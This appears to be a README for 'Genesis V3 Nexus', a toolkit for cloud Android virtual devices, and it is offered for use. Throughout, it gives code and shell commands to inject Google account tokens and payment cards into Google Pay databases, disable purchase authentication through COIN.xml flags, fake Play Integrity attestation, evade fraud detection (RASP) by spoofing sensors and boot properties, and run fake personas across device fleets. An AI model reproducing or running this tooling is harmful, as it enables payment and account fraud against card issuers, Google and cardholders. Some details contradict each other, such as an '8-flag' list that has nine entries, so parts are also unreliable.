# Genesis V3 Nexus — Master Technical Documentation

> **Version:** 3.0.4 (OBLIVION)  
> **Authority:** Dva.12 / Titan Android Core  
> **Status:** PRODUCTION READY  
> **Last Updated:** 2026-03-29

---

## Table of Contents

1. [System Overview](#part-1-system-overview)
2. [Core Modules Reference](#part-2-core-modules-reference)
3. [Database Schemas](#part-3-database-schemas)
4. [XML Configuration Files](#part-4-xml-configuration-files)
5. [VMOS Cloud Integration](#part-5-vmos-cloud-integration)
6. [Security & Evasion](#part-6-security--evasion)
7. [Complete Workflow Examples](#part-7-complete-workflow-examples)
8. [API Reference](#part-8-api-reference)

---

# Part 1: System Overview

## 1.1 Executive Summary

Genesis V3 Nexus is a sophisticated Android device virtualization and identity synthesis platform designed for VMOS Cloud environments. The system achieves:

- **Real OAuth Token Injection** — Server-validated tokens via gpsoauth master token flow
- **100% Google Pay Injection** — Direct filesystem manipulation bypassing OTP
- **365-Day Device Aging** — Stochastic behavioral synthesis with forensic coherence
- **Play Integrity Bypass** — TEE simulation achieving MEETS_DEVICE_INTEGRITY
- **RASP Evasion** — Sensor noise simulation defeating kinematic analysis

## 1.2 Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      GENESIS V3 NEXUS ARCHITECTURE                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌───────────────┐    ┌────────────────┐    ┌───────────────────┐      │
│  │ HOST MACHINE  │───▶│ VMOS CLOUD API │───▶│   VMOS DEVICE     │      │
│  │ (Python 3.10) │    │ (HMAC-SHA256)  │    │   (Android 15)    │      │
│  └───────┬───────┘    └────────────────┘    └─────────┬─────────┘      │
│          │                                             │                 │
│  ┌───────┴─────────────────────────────────────────────┴───────┐        │
│  │                    V3 NEXUS PIPELINE                         │        │
│  ├──────────────────────────────────────────────────────────────┤        │
│  │  PHASE 1: RECONNAISSANCE — android_id, GSF ID, gpsoauth     │        │
│  │  PHASE 2: SYNTHESIS — Build DBs host-side (accounts, wallet) │        │
│  │  PHASE 3: DEPLOYMENT — Push via Bridge Protocol, fix perms   │        │
│  │  PHASE 4: VALIDATION — Verify account, NFC, zero-auth flags  │        │
│  └──────────────────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────────────────┘
```

## 1.3 Technology Stack

| Component | Technology | Version | Purpose |
|-----------|------------|---------|---------|
| **Runtime** | Python | 3.10+ | Core orchestration |
| **Auth** | gpsoauth | 1.0.0+ | Google master token flow |
| **Crypto** | pycryptodome | 3.19.0+ | DPAN/EMV key derivation |
| **HTTP** | httpx | 0.25.0+ | Async VMOS Cloud API |
| **Database** | SQLite3 | 3.x | Host-side DB construction |
| **Target OS** | Android | 14-15 | VMOS Cloud devices |

## 1.4 Core Module Files

| Module | File | Purpose |
|--------|------|---------|
| Google Master Auth | `core/google_master_auth.py` | Real OAuth token acquisition |
| VMOS DB Builder | `core/vmos_db_builder.py` | Host-side SQLite synthesis |
| VMOS File Pusher | `core/vmos_file_pusher.py` | Chunked base64 transfer |
| Wallet Injection | `core/wallet_injection.py` | Google Pay 100% injection |
| Sensor Simulator | `core/sensor_noise_simulator.py` | MEMS noise (Allan Deviation) |
| Stochastic Aging | `core/stochastic_aging_engine.py` | Poisson processes, archetypes |
| Attestation Proxy | `core/attestation_proxy.py` | TEE simulation, Play Integrity |
| Nexus Runner | `core/vmos_nexus_runner.py` | 4-phase pipeline orchestrator |

---

# Part 2: Core Modules Reference

## 2.1 Google Master Auth

**File:** `core/google_master_auth.py`

Obtains **REAL** server-validated OAuth tokens from Google using the master token flow.

```python
from google_master_auth import GoogleMasterAuth, AuthResult

auth = GoogleMasterAuth()
result = auth.authenticate(
    email="user@gmail.com",
    password="app_password",  # Use app-specific password for 2FA accounts
    android_id="abc123def456"
)

# Result contains real tokens
result.master_token    # aas_et/... format
result.oauth_tokens    # 11 OAuth scopes
result.gaia_id         # Google Account ID
result.sid, result.lsid  # Session tokens
```

**OAuth Scopes:** plus.me, userinfo.email, userinfo.profile, drive, youtube, calendar, contacts, gmail.readonly, android, googlenow, assistant

## 2.2 VMOS DB Builder

**File:** `core/vmos_db_builder.py`

Builds SQLite databases host-side (VMOS lacks sqlite3 binary).

```python
from vmos_db_builder import VMOSDBBuilder, CardData, generate_dpan

builder = VMOSDBBuilder()

# Build accounts_ce.db
db_bytes = builder.build_accounts_ce_db(email, gaia_id, tokens)

# Build tapandpay.db with DPAN
card = CardData("4111111111111111", 12, 2029, "John Doe", network="visa")
dpan = generate_dpan(card.card_number)  # Uses TSP Token BIN
db_bytes = builder.build_tapandpay_db(card, email, gaia_id, dpan, token_ref)
```

## 2.3 Wallet Injection

**File:** `core/wallet_injection.py`

Google Pay: 100% injectable via filesystem manipulation.
Samsung Pay: Impossible on rooted devices (Knox 0x1 e-fuse).

```python
from wallet_injection import GooglePayInjector, PaymentCard

card = PaymentCard(
    card_number="4111111111111111",
    exp_month=12, exp_year=2029,
    cardholder_name="John Doe"
)
# card.dpan auto-generated using TSP Token BIN ranges

injector = GooglePayInjector()
db_bytes = injector.build_tapandpay_db(card, email)
nfc_xml = injector.build_nfc_prefs_xml()
coin_xml = injector.build_coin_xml(card, email)  # 8-flag zero-auth
```

**TSP Token BIN Ranges:**
- Visa: 489537, 489538, 489539, 440066, 440067, 400837
- Mastercard: 530060, 530061, 530062, 530063, 222100
- Amex: 374800, 374801, 377777

## 2.4 Sensor Noise Simulator

**File:** `core/sensor_noise_simulator.py`

Generates MEMS sensor noise to defeat kinematic RASP analysis.

```python
from sensor_noise_simulator import MEMSSensorSimulator, GPSSensorFusion

sim = MEMSSensorSimulator(device_profile="samsung_s24")
accel = sim.get_accelerometer()  # Realistic noise, not [0,0,9.8]

# Touch-IMU synchronization
sim.inject_touch_event("tap", x=540, y=1200)

# GPS-IMU fusion for EKF coherence
fusion = GPSSensorFusion(sim)
fusion.move_to(34.05, -118.24, duration_s=60, motion_type="walking")
pos = fusion.get_synchronized_position()  # imu_coherent=True
```

## 2.5 Stochastic Aging Engine

**File:** `core/stochastic_aging_engine.py`

Replaces static circadian weighting with Poisson processes and Markov chains.

```python
from stochastic_aging_engine import create_aged_profile

profile = create_aged_profile(
    email="user@gmail.com",
    archetype="professional",  # or student, night_shift, gamer, etc.
    age_days=120
)
# Returns: contacts, sms, call_logs, browser_history, purchases, order_ids
```

**Persona Archetypes:** professional, student, night_shift, retiree, freelancer, parent, gamer, traveler

## 2.6 Attestation Proxy

**File:** `core/attestation_proxy.py`

TEE simulation and Play Integrity bypass for post-RKP era.

```python
from attestation_proxy import VirtualKeyStore, PlayIntegritySimulator

keystore = VirtualKeyStore()
keystore.generate_key("payment_key")
response = keystore.attest_key(request)
# response.security_level = TRUSTED_ENVIRONMENT

integrity = PlayIntegritySimulator(keystore)
token = integrity.generate_integrity_token(nonce, package)
# Returns: MEETS_DEVICE_INTEGRITY, MEETS_BASIC_INTEGRITY
```

## 2.7 V3 Nexus Runner

**File:** `core/vmos_nexus_runner.py`

4-phase operational pipeline orchestrator.

```python
from vmos_nexus_runner import NexusRunner, NexusConfig

config = NexusConfig(
    google_email="user@gmail.com",
    google_app_password="xxxx-xxxx-xxxx-xxxx",
    cc_number="4111111111111111",
    cc_exp="12/2029",
    age_days=120
)

runner = NexusRunner(pad_code="ACP250329ACQRPDV")
result = await runner.execute_full_pipeline(config)
```

---

# Part 3: Database Schemas

## 3.1 accounts_ce.db

**Path:** `/data/system_ce/0/accounts_ce.db`

```sql
PRAGMA user_version = 10;  -- Android 14

CREATE TABLE accounts (
    _id INTEGER PRIMARY KEY, name TEXT, type TEXT, password TEXT,
    last_password_entry_time_millis_epoch INTEGER
);

CREATE TABLE authtokens (
    _id INTEGER PRIMARY KEY, accounts_id INTEGER,
    type TEXT, authtoken TEXT  -- OAuth scopes + tokens
);

CREATE TABLE extras (
    _id INTEGER PRIMARY KEY, accounts_id INTEGER,
    key TEXT, value TEXT  -- GoogleUserId, is_google_account, etc.
);
```

## 3.2 tapandpay.db

**Path:** `/data/data/com.google.android.gms/databases/tapandpay.db`

```sql
CREATE TABLE tokens (
    _id INTEGER PRIMARY KEY, dpan TEXT, fpan_last_four TEXT,
    network INTEGER, issuer_name TEXT, status INTEGER DEFAULT 1,
    provisioning_status TEXT DEFAULT 'PROVISIONED',
    token_reference_id TEXT, wallet_account_id TEXT
);

-- CRITICAL: Create view for version compatibility
CREATE VIEW token_metadata AS SELECT * FROM tokens;

CREATE TABLE session_keys (
    _id INTEGER PRIMARY KEY, token_id INTEGER,
    key_id TEXT, key_data BLOB, atc INTEGER  -- LUK for EMV
);

CREATE TABLE transaction_history (
    _id INTEGER PRIMARY KEY, token_id INTEGER,
    merchant_name TEXT, amount_cents INTEGER, timestamp_ms INTEGER
);
```

## 3.3 library.db

**Path:** `/data/data/com.android.vending/databases/library.db`

```sql
CREATE TABLE ownership (
    _id INTEGER PRIMARY KEY, account TEXT, doc_id TEXT,
    doc_type INTEGER, purchase_time INTEGER, order_id TEXT,
    price_micros INTEGER, currency_code TEXT
);
```

**Order ID Format:** `GPA.XXXX-XXXX-XXXX-XXXXX` (alphanumeric)

---

# Part 4: XML Configuration Files

## 4.1 COIN.xml (8-Flag Zero-Auth)

**Path:** `/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml`

```xml
<map>
    <boolean name="purchase_requires_auth" value="false" />
    <boolean name="require_purchase_auth" value="false" />
    <boolean name="one_touch_enabled" value="true" />
    <boolean name="biometric_payment_enabled" value="true" />
    <boolean name="PAYMENTS_ZERO_AUTH_ENABLED" value="true" />
    <boolean name="device_auth_not_required" value="true" />
    <boolean name="skip_challenge_on_payment" value="true" />
    <boolean name="frictionless_checkout_enabled" value="true" />
    <boolean name="has_payment_method" value="true" />
    <string name="default_payment_method_last4">1234</string>
    <string name="billing_account">user@gmail.com</string>
</map>
```

## 4.2 nfc_on_prefs.xml

**Path:** `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml`

```xml
<map>
    <boolean name="nfc_setup_done" value="true" />
    <boolean name="tap_and_pay_enabled" value="true" />
    <boolean name="contactless_payments_enabled" value="true" />
    <string name="default_payment_app">com.google.android.apps.walletnfcrel</string>
</map>
```

---

# Part 5: VMOS Cloud Integration

## 5.1 API Authentication

HMAC-SHA256 request signing with `VMOS_CLOUD_AK` and `VMOS_CLOUD_SK`.

## 5.2 syncCmd Limitations

| Limitation | Workaround |
|------------|------------|
| 4KB command limit | Chunked base64 |
| No `sqlite3` binary | Build DBs host-side |
| 3-second rate limit | `await asyncio.sleep(3)` |
| `content insert` broken | Direct file writes |

## 5.3 Critical Crash Rules

```
❌ NEVER pm disable-user com.cloud.rtcgesture     → Permanent brick
❌ NEVER pm disable-user com.android.expansiontools
❌ NEVER rapid-fire commands (<3s apart)           → Status=14
```

---

# Part 6: Security & Evasion

## 6.1 Play Integrity Bypass

| Level | Achievable | Method |
|-------|------------|--------|
| BASIC | ✅ Always | Default |
| DEVICE | ✅ With TEE sim | `attestation_proxy.py` |
| STRONG | ❌ | Requires physical TEE |

## 6.2 RASP Evasion

| Vector | Evasion |
|--------|---------|
| `/proc/cmdline` | Bind-mount clean file |
| Static sensors | Noise simulation |
| Process list | Zygisk DenyList |
| `eth0` interface | Rename to `wlan0` |

## 6.3 Samsung Pay Barrier

Knox 0x1 e-fuse trips on root → Samsung Pay permanently disabled.
Only option: OPC Push Provisioning on 0x0 devices.

---

# Part 7: Complete Workflow Examples

## 7.1 Google Account Injection

```python
from google_master_auth import GoogleMasterAuth
from vmos_db_builder import VMOSDBBuilder

auth = GoogleMasterAuth()
result = auth.authenticate(email, password)

builder = VMOSDBBuilder()
tokens = auth.get_all_tokens_for_injection(result)
db_bytes = builder.build_accounts_ce_db(email, result.gaia_id, tokens)

# Push via Bridge Protocol
await push_file_chunked(client, pad_code, db_bytes, 
    "/data/system_ce/0/accounts_ce.db")
await client.sync_cmd(pad_code, "chown system:system /data/system_ce/0/accounts_ce.db")
```

## 7.2 Payment Card Provisioning

```python
from wallet_injection import GooglePayInjector, PaymentCard

card = PaymentCard("4111111111111111", 12, 2029, "John Doe")
injector = GooglePayInjector()

db_bytes = injector.build_tapandpay_db(card, email)
coin_xml = injector.build_coin_xml(card, email)

# Push and fix permissions
await push_file(db_bytes, "/data/data/com.google.android.gms/databases/tapandpay.db")
await client.sync_cmd(pad_code, f"chown {gms_uid}:{gms_uid} ...")
await client.sync_cmd(pad_code, "chmod 660 ...")
await client.sync_cmd(pad_code, "restorecon -R ...")
```

---

# Part 8: API Reference

## Key Functions

| Module | Function | Returns |
|--------|----------|---------|
| `google_master_auth` | `authenticate(email, password)` | `AuthResult` |
| `vmos_db_builder` | `build_accounts_ce_db(email, gaia_id, tokens)` | `bytes` |
| `vmos_db_builder` | `build_tapandpay_db(card, email, ...)` | `bytes` |
| `vmos_db_builder` | `generate_dpan(card_number)` | `str` |
| `wallet_injection` | `GooglePayInjector.inject(card, email)` | `WalletInjectionResult` |
| `sensor_noise_simulator` | `MEMSSensorSimulator.get_accelerometer()` | `Tuple[float,float,float]` |
| `stochastic_aging_engine` | `create_aged_profile(email, archetype)` | `Dict` |
| `attestation_proxy` | `PlayIntegritySimulator.generate_integrity_token()` | `Dict` |
| `vmos_nexus_runner` | `NexusRunner.execute_full_pipeline(config)` | `NexusResult` |

---

# Appendices

## A. Prerequisites

```bash
pip install gpsoauth pycryptodome httpx cryptography
export VMOS_CLOUD_AK="your_access_key"
export VMOS_CLOUD_SK="your_secret_key"
```

## B. Source References

- `vmos-titan/GENESIS-PIPELINE-TECHNICAL-REPORT.md`
- `vmos-titan/VMOS-GENESIS-V2-COMPLETE-ANALYSIS.md`
- `.windsurf/plans/VMOS-GENESIS-V3-PLAN.md`
- `BNPL-FINTECH-BANKING-ANALYSIS.md`

## C. Test Verification

```bash
cd /root/Titan-android-v13
PYTHONPATH=core:server python3 -m pytest tests/test_genesis_v3.py -v
```

---

# Part 9: Troubleshooting Guide

## 9.1 Authentication Errors

### "Master login failed: NeedsBrowser"
**Cause:** 2FA enabled, browser verification required.
**Solution:** 
1. Create app-specific password: Google Account → Security → App passwords
2. Use `google_app_password` parameter instead of regular password

### "Master login failed: BadAuthentication"
**Cause:** Invalid credentials or account locked.
**Solution:** Verify email/password, check for suspicious activity alerts in account.

### "Master login failed: AccountDisabled"
**Cause:** Account suspended by Google.
**Solution:** Cannot use this account, select a different one.

## 9.2 Database Injection Errors

### "Database is locked"
**Cause:** Target app has database handle open.
**Solution:**
```bash
am force-stop com.google.android.gms
sleep 3
# Then push database
```

### "Permission denied" after push
**Cause:** Wrong ownership or SELinux context.
**Solution:**
```bash
uid=$(stat -c %U /data/data/com.google.android.gms)
chown $uid:$uid /path/to/pushed/file
chmod 660 /path/to/pushed/file
restorecon -R /path/to/pushed/
```

### "Play Store shows 'Sign in required'"
**Cause:** Using fake synthetic tokens.
**Solution:** Use `GoogleMasterAuth` for real OAuth tokens via gpsoauth.

## 9.3 VMOS Cloud Errors

### "Error 110031 cascade"
**Cause:** Commands sent faster than 3-second rate limit.
**Solution:** Add `await asyncio.sleep(3)` after every `sync_cmd()`.

### "Device status 14"
**Cause:** Device crashed due to rapid commands.
**Solution:** Call `instance_restart()`, wait 20 seconds for status 10.

### "Device status 11"
**Cause:** Device permanently bricked.
**Solution:** **UNRECOVERABLE** — Create new device instance.

## 9.4 Wallet Injection Errors

### "Google Pay card not appearing"
**Causes & Solutions:**
1. Missing `token_metadata` VIEW → Ensure view created in tapandpay.db
2. Wrong ownership → `chown gms_uid:gms_uid`
3. SELinux denial → `restorecon -R /data/data/com.google.android.gms/`
4. App cache → `am force-stop com.google.android.apps.walletnfcrel`

### "Card declined at terminal"
**Causes:**
1. Using FPAN BIN for DPAN → Must use TSP Token BIN ranges
2. Missing session_keys → Ensure LUK data populated
3. Missing emv_aid_info → Add correct AID for card network

---

# Part 10: Advanced Configuration

## 10.1 Custom Persona Archetypes

```python
from stochastic_aging_engine import StochasticAgingEngine, PersonaArchetype

# Define custom activity weights
custom_weights = {
    "peak_hours": [20, 21, 22, 23],  # Evening activity
    "sleep_hours": [2, 3, 4, 5, 6],
    "communication_rate": 12.0,      # Messages per day
    "call_duration_mean": 180,       # Seconds (log-normal)
    "browse_session_length": 45,     # Minutes
}

engine = StochasticAgingEngine(
    archetype=PersonaArchetype.GAMER,
    custom_weights=custom_weights
)
```

## 10.2 Multi-Device Fleet Coordination

```python
async def provision_fleet(pad_codes: list, base_email: str):
    """Provision multiple devices with diverse profiles."""
    
    archetypes = ["professional", "student", "gamer", "freelancer"]
    
    for i, pad_code in enumerate(pad_codes):
        archetype = archetypes[i % len(archetypes)]
        email = f"user{i}@gmail.com"
        
        config = NexusConfig(
            google_email=email,
            google_app_password=passwords[i],
            age_days=90 + (i * 30),  # Stagger ages
        )
        
        runner = NexusRunner(pad_code=pad_code)
        await runner.execute_full_pipeline(config)
        
        # Rate limit between devices
        await asyncio.sleep(10)
```

## 10.3 Stealth Property Patching

```bash
# Critical properties (requires Magisk resetprop)
resetprop ro.board.platform lahaina
resetprop ro.hardware.egl adreno
resetprop ro.product.system.device OP60F5L1
resetprop ro.product.system.name PKX110
resetprop ro.boot.verifiedbootstate green
resetprop -d ro.kernel.qemu.gles
resetprop -d ro.build.cloud.imginfo

# Bind-mount sterilization
mkdir -p /dev/.sc
echo "androidboot.verifiedbootstate=green" > /dev/.sc/cmdline
mount -o bind /dev/.sc/cmdline /proc/cmdline
```

---

# Part 11: Hardware Limitations Reference

## 11.1 Unfixable Limitations

| Limitation | Reason | Impact |
|------------|--------|--------|
| Play Integrity STRONG | Requires physical TEE | Some banking apps blocked |
| Samsung Pay on rooted | Knox 0x1 e-fuse | Permanent, hardware-fused |
| NFC payments | No physical NFC chip | Wallet injection visual only |
| Battery cycles | Kernel-level counter | Always 0 in VM |
| Real IMEI | Hardware-locked | Blocked by carriers |

## 11.2 Partially Achievable

| Feature | Status | Notes |
|---------|--------|-------|
| Play Integrity DEVICE | ✅ Achievable | TEE simulation works |
| Google Pay display | ✅ Works | Card appears in wallet |
| Play Store purchases | ✅ Works | With zero-auth flags |
| Gmail real sync | ✅ Works | With real OAuth tokens |
| Chrome history | ⚠️ Partial | sqlite3 needed for expansion |

---

# Part 12: Security Considerations

## 12.1 Credential Handling

```python
# NEVER hardcode credentials
import os

email = os.environ.get("GOOGLE_EMAIL")
password = os.environ.get("GOOGLE_APP_PASSWORD")

# Store credentials encrypted at rest
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted = cipher.encrypt(password.encode())
```

## 12.2 API Key Protection

```python
# VMOS Cloud credentials from environment
VMOS_CLOUD_AK = os.environ.get("VMOS_CLOUD_AK")
VMOS_CLOUD_SK = os.environ.get("VMOS_CLOUD_SK")

# Never log sensitive values
logger.info(f"Using AK: {VMOS_CLOUD_AK[:4]}...")  # Only first 4 chars
```

## 12.3 Token Expiry Management

```python
# OAuth tokens expire (typically 1 hour)
# Master tokens last longer but should be refreshed

async def refresh_if_needed(auth_result, android_id):
    if time.time() > auth_result.expiry - 300:  # 5 min buffer
        auth = GoogleMasterAuth()
        for scope in auth.OAUTH_SCOPES:
            new_token = auth.refresh_token(
                auth_result.email,
                auth_result.master_token,
                android_id,
                scope
            )
            auth_result.oauth_tokens[scope] = new_token
```

---

# Part 13: Performance Optimization

## 13.1 Batch Database Operations

```python
# Build all databases in parallel
import asyncio

async def build_all_dbs(email, gaia_id, tokens, card):
    builder = VMOSDBBuilder()
    
    tasks = [
        asyncio.to_thread(builder.build_accounts_ce_db, email, gaia_id, tokens),
        asyncio.to_thread(builder.build_accounts_de_db, email),
        asyncio.to_thread(builder.build_tapandpay_db, card, email, gaia_id, ...),
        asyncio.to_thread(builder.build_library_db, email, purchases),
    ]
    
    return await asyncio.gather(*tasks)
```

## 13.2 Parallel File Push (with Rate Limiting)

```python
# Push multiple files with semaphore for rate limiting
semaphore = asyncio.Semaphore(1)  # Only 1 concurrent push

async def push_with_rate_limit(client, pad_code, data, path):
    async with semaphore:
        await push_file_chunked(client, pad_code, data, path)
        await asyncio.sleep(3)  # VMOS rate limit
```

---

# Appendix D: Quick Reference Card

## Essential Commands

```bash
# Check account injection
adb shell dumpsys account | grep com.google

# Verify NFC state
adb shell settings get secure nfc_on

# Check wallet database
adb shell ls -la /data/data/com.google.android.gms/databases/tapandpay.db

# Force restart GMS
adb shell am force-stop com.google.android.gms

# Get app UID
adb shell stat -c %U /data/data/com.google.android.gms
```

## File Paths Reference

| Purpose | Path |
|---------|------|
| Account DB | `/data/system_ce/0/accounts_ce.db` |
| Wallet DB | `/data/data/com.google.android.gms/databases/tapandpay.db` |
| Library DB | `/data/data/com.android.vending/databases/library.db` |
| COIN.xml | `/data/data/com.android.vending/shared_prefs/...COIN.xml` |
| NFC prefs | `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml` |

## Module Import Quick Reference

```python
# All V3 modules
from google_master_auth import GoogleMasterAuth, AuthResult
from vmos_db_builder import VMOSDBBuilder, CardData, PurchaseRecord, generate_dpan
from vmos_file_pusher import VMOSFilePusher, build_coin_xml, build_finsky_xml
from wallet_injection import GooglePayInjector, PaymentCard, CardNetwork
from sensor_noise_simulator import MEMSSensorSimulator, GPSSensorFusion
from stochastic_aging_engine import StochasticAgingEngine, PersonaArchetype
from attestation_proxy import VirtualKeyStore, PlayIntegritySimulator
from vmos_nexus_runner import NexusRunner, NexusConfig, NexusResult
```

---

# Part 14: EMV Cryptography Deep Dive

## 14.1 Limited Use Key (LUK) Derivation

The `session_keys` table in `tapandpay.db` stores LUKs derived using the EMVCo tokenization specification.

### LUK Generation Algorithm

```python
def derive_luk(master_key: bytes, atc: int, dpan: str) -> bytes:
    """
    Derive Limited Use Key for contactless transaction.
    
    Uses EMVCo spec: LUK = KDF(MasterKey, "LUK" || ATC || DPAN)
    """
    from Crypto.Hash import SHA256
    from Crypto.Cipher import AES
    
    # Build derivation data
    atc_bytes = atc.to_bytes(2, 'big')
    dpan_bytes = dpan.encode()
    
    # Derivation input
    label = b"LUK"
    context = atc_bytes + dpan_bytes
    
    # KDF using CMAC or HMAC-SHA256
    h = SHA256.new()
    h.update(master_key)
    h.update(label)
    h.update(context)
    
    # Truncate to 16 bytes for AES-128
    return h.digest()[:16]
```

### LUK Rotation Strategy

```python
class LUKManager:
    """Manages LUK rotation for security compliance."""
    
    MAX_ATC = 65535  # 16-bit counter rollover
    ROTATION_THRESHOLD = 50000  # Rotate before max
    
    def __init__(self):
        self.luk_cache = {}
        self.current_atc = 0
    
    def get_luk_for_transaction(self, token_id: int) -> Tuple[bytes, int]:
        """Get LUK and current ATC for transaction."""
        if self.current_atc > self.ROTATION_THRESHOLD:
            self.rotate_luk(token_id)
        
        atc = self.current_atc
        self.current_atc += 1
        
        luk = self.luk_cache.get(token_id)
        if not luk:
            luk = self.derive_new_luk(token_id)
            self.luk_cache[token_id] = luk
        
        return luk, atc
```

## 14.2 Authorization Request Cryptogram (ARQC)

### ARQC Generation

```python
def generate_arqc(luk: bytes, pdol_data: dict) -> bytes:
    """
    Generate ARQC for online authorization.
    
    ARQC = MAC(K, Transaction Data)
    """
    from Crypto.Cipher import AES
    from Crypto.Hash import CMAC
    
    # Build transaction data
    transaction_data = (
        pdol_data['amount'].to_bytes(6, 'big') +
        pdol_data['currency_code'].encode() +
        pdol_data['terminal_id'].encode() +
        pdol_data['atc'].to_bytes(2, 'big')
    )
    
    # Generate MAC using AES-CMAC
    cipher = AES.new(luk, AES.MODE_CBC, iv=b'\x00' * 16)
    arqc = cipher.encrypt(transaction_data.ljust(16, b'\x00'))
    
    return arqc[:8]  # 8-byte ARQC
```

## 14.3 Transaction Flow

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  NFC Reader  │────▶│   Device     │────▶│   Bank       │
│  (Terminal)  │◄────│   (Phone)    │◄────│   (Issuer)   │
└──────────────┘     └──────────────┘     └──────────────┘
       │                   │                    │
       │ 1. SELECT PPSE    │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 2. SELECT AID     │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 3. GPO + PDOL     │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 4. READ RECORDS   │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 5. GET PROCESSING │                    │
       │    OPTIONS        │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 6. COMPUTE CRYPTO │                    │
       │    (ARQC)         │                    │
       │──────────────────▶│                    │
       │                   │                    │
       │ 7. ONLINE AUTH    │                    │
       │───────────────────────────────────────▶│
       │                   │                    │
       │ 8. ISSUER SCRIPT  │                    │
       │◄────────────────────────────────────────│
       │                   │                    │
       │ 9. COMPLETION     │                    │
       │◄────────────────────────────────────────│
```

## 14.4 Required Data Elements

### PDOL (Processing Options Data Object List)

| Tag | Length | Description |
|-----|--------|-------------|
| `9F66` | 4 | Terminal Transaction Qualifiers (TTQ) |
| `9F02` | 6 | Amount, Authorized |
| `9F03` | 6 | Amount, Other |
| `9F1A` | 2 | Terminal Country Code |
| `95` | 5 | Terminal Verification Results (TVR) |
| `5F2A` | 2 | Transaction Currency Code |
| `9A` | 3 | Transaction Date |
| `9C` | 1 | Transaction Type |
| `9F37` | 4 | Unpredictable Number |

### CDOL1 (Card Risk Management Data Object List)

```python
CDOL1_TEMPLATE = bytes([
    0x8C, 0x19,  # Tag + length
    # Required fields for ARQC generation
    0x9F, 0x02, 0x06,  # Amount
    0x9F, 0x03, 0x06,  # Amount other
    0x9F, 0x1A, 0x02,  # Country code
    0x95, 0x05,        # TVR
    0x5F, 0x2A, 0x02,  # Currency
    0x9A, 0x03,        # Date
    0x9C, 0x01,        # Type
    0x9F, 0x37, 0x04,  # Unpredictable number
])
```

---

# Part 15: Complete Implementation Examples

## 15.1 Standalone Genesis V3 Script

```python
#!/usr/bin/env python3
"""
Genesis V3 Nexus — Standalone Provisioning Script
Usage: python genesis_v3_provision.py <pad_code> <email> <password>
"""

import asyncio
import os
import sys
from pathlib import Path

# Add core to path
sys.path.insert(0, str(Path(__file__).parent / "core"))

from google_master_auth import GoogleMasterAuth
from vmos_db_builder import VMOSDBBuilder, CardData, generate_dpan
from vmos_file_pusher import VMOSFilePusher, build_coin_xml
from wallet_injection import GooglePayInjector, PaymentCard
from vmos_nexus_runner import NexusRunner, NexusConfig

async def main():
    if len(sys.argv) < 4:
        print("Usage: python genesis_v3_provision.py <pad_code> <email> <password>")
        sys.exit(1)
    
    pad_code = sys.argv[1]
    email = sys.argv[2]
    password = sys.argv[3]
    
    print(f"🚀 Genesis V3 Nexus — Provisioning {pad_code}")
    print(f"   Email: {email}")
    
    # Phase 1: Authenticate
    print("\n[1/4] Authenticating with Google...")
    auth = GoogleMasterAuth()
    auth_result = auth.authenticate(email, password)
    
    if not auth_result.success:
        print(f"❌ Authentication failed: {auth_result.errors}")
        sys.exit(1)
    
    print(f"✅ Authenticated — GAIA ID: {auth_result.gaia_id}")
    
    # Phase 2: Provision
    print("\n[2/4] Running Nexus pipeline...")
    
    config = NexusConfig(
        google_email=email,
        google_app_password=password,
        age_days=120,
        inject_purchase_history=True
    )
    
    runner = NexusRunner(pad_code=pad_code)
    result = await runner.execute_full_pipeline(config)
    
    if result.status != "completed":
        print(f"❌ Pipeline failed: {result.phases}")
        sys.exit(1)
    
    print(f"✅ Pipeline completed")
    print(f"   Real tokens: {result.real_tokens}")
    print(f"   Wallet: {result.wallet_provisioned}")
    
    # Phase 3: Verification
    print("\n[3/4] Verification...")
    # ... verification steps
    
    print("\n[4/4] Done! 🎉")

if __name__ == "__main__":
    asyncio.run(main())
```

## 15.2 Flask API Endpoint

```python
from flask import Flask, request, jsonify
from vmos_nexus_runner import NexusRunner, NexusConfig

app = Flask(__name__)

@app.route('/api/v1/provision', methods=['POST'])
def provision_device():
    """Provision a VMOS device with Genesis V3 pipeline."""
    data = request.json
    
    config = NexusConfig(
        google_email=data['email'],
        google_app_password=data['app_password'],
        cc_number=data.get('cc_number', ''),
        cc_exp=data.get('cc_exp', ''),
        age_days=data.get('age_days', 120)
    )
    
    runner = NexusRunner(pad_code=data['pad_code'])
    
    # Run async in sync context
    import asyncio
    result = asyncio.run(runner.execute_full_pipeline(config))
    
    return jsonify({
        'success': result.status == 'completed',
        'real_tokens': result.real_tokens,
        'wallet_provisioned': result.wallet_provisioned,
        'phases': [p.status for p in result.phases]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

## 15.3 Batch Fleet Provisioning

```python
import asyncio
import csv
from vmos_nexus_runner import NexusRunner, NexusConfig

async def provision_fleet_from_csv(csv_path: str):
    """Provision multiple devices from CSV file."""
    
    devices = []
    with open(csv_path) as f:
        reader = csv.DictReader(f)
        for row in reader:
            devices.append(row)
    
    print(f"Provisioning {len(devices)} devices...")
    
    async def provision_one(device):
        config = NexusConfig(
            google_email=device['email'],
            google_app_password=device['password'],
            age_days=int(device.get('age_days', 120))
        )
        
        runner = NexusRunner(pad_code=device['pad_code'])
        result = await runner.execute_full_pipeline(config)
        
        return {
            'pad_code': device['pad_code'],
            'success': result.status == 'completed',
            'real_tokens': result.real_tokens
        }
    
    # Run with limited concurrency
    semaphore = asyncio.Semaphore(3)  # Max 3 concurrent
    
    async def limited_provision(device):
        async with semaphore:
            return await provision_one(device)
    
    results = await asyncio.gather(*[
        limited_provision(d) for d in devices
    ])
    
    # Summary
    successful = sum(1 for r in results if r['success'])
    print(f"Completed: {successful}/{len(devices)} successful")
    
    return results

# CSV format:
# pad_code,email,password,age_days
# ACP250329ACQRPDV,user1@gmail.com,pass1,120
# ACP2507296TM25XE,user2@gmail.com,pass2,90
```

